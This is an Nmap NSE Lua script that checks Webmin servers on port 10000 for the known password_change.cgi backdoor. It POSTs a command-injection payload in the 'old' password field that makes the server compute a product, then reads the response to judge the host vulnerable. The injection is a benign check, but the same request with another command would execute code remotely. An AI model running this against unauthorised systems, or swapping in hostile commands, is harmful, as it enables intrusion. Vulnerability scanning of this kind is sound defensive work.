-- The head
local stdnse = require "stdnse"
local  shortport = require "shortport"
local http = require "http"
local url = require "url"
local openssl = require "openssl"
local base64 = require "base64"

description = [[
This is a script to check for the Webmin Backdoor
]]

---
-- @usage nmap -p 10000 --script webmin-vuln.nse <target>
--
-- @args Nonw
--
-- @output
-- PORT      STATE SERVICE VERSION
-- 10000/tcp open  http    MiniServ 1.920 (Webmin httpd)
-- | http-webmin-info: 
-- |_  Hello from your NSE Script!
--
-- @see <reference>.nse
---

categories = {"Intrusive"}
author = "Jon Gorenflo"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"


-- The rule

portrule = shortport.port_or_service ({10000}, {"http", "https"}, "tcp", "open")

-- The action

action = function(host, port)
    --local headers = {["Referer"]="/password_change.cgi"}
    local options = {header={}}
    options["header"]["Referer"] = string.format("https://%s:%s/", host.ip,port.number)
    options.scheme="https"
    local token = base64.enc(openssl.md5(host["ip"] .. os.date()))
    math.randomseed(os.time())
    local num1 = math.floor(math.random() * 1000000)
    local num2 = math.floor(math.random() * 1000000)
    local equation = num1 .. " x ".. num2 .. " ="
    local product = num1 * num2
    local command = string.format(" |echo %s $((%s*%s))", equation, num1, num2)
    local result = string.format("%s %s", equation, product)
    local payload = string.format("user=bin&pam=&expired=0&old=badpass %s &new1=newpass&new2=newpass", command)
    local response = http.post(host.ip, port, "/password_change.cgi", options, nil, payload)

    if string.match(response["rawbody"], result) then
       return stdnse.format_output(true, string.format("Vulnerable: The script submitted \"%s\" as a payload. \nThe site executed the calculation and returned \"%s\" in the body of the response.", command, result))
    end
end
















